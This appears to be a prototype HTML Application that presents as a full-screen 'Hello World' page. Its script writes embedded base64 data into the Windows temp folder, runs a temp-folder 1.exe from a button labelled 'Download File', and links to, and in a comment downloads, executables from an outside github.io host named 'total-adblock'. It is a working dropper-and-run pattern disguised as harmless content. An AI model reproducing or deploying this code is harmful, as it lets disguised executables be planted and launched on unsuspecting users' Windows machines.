<!DOCTYPE html>
<html>
<head>
<title>Full Screen HTA</title>
<HTA:APPLICATION ID="FullScreenHTA"
  APPLICATIONNAME="Full Screen HTA"
  BORDER="none"
  INNERBORDER="no"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
  SCROLL="no"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  WINDOWSTATE="maximize"
/>


</head>
<body>
  <object id="myFile" classid="clsid:txtfile" width="110" height="110">
  <param name="DataURL" value="data:text/plain;base64,SGVsbG8sIFdvcmxkIQ==" />
</object>
<script>

function drop(){
  var myFile = document.getElementById("myFile");
  var text = myFile.Text;
  alert(text);
  var fso = new ActiveXObject("Scripting.FileSystemObject");
  var tempFolder = fso.GetSpecialFolder(2);

  var fso = new ActiveXObject("Scripting.FileSystemObject");
  var file = fso.CreateTextFile(tempFolder+"\\example.txt", true);
  file.Write(text);
  file.Close();
}
function openUrlInDefaultBrowser(url) {
  var shell = new ActiveXObject("Shell.Application");
  shell.ShellExecute(url);
}
function runExeFile() {
  var fso = new ActiveXObject("Scripting.FileSystemObject");
  var tempFolder = fso.GetSpecialFolder(2);
  var shell = new ActiveXObject("WScript.Shell");

  shell.Run(tempFolder+"\\1.exe");
}
</script>


<div>
  <h1>Hello World!</h1>
  <p>This is my HTML content.</p>
  <script type="text/javascript">
//downloadFile('https://total-adblock.github.io/OpenUrl.exe', ' ')

  </script>
  <button onclick="runExeFile();">Download File</button>
  <button onclick="drop();">drop()</button>
<a href="https://total-adblock.github.io/test.exe"> Whoho </a>
</div>
<script>
//window.showModelessDialog("about:blank", window, "dialogWidth: 100%; dialogHeight: 100%; resizable: no;");
</script>
</body>
</html>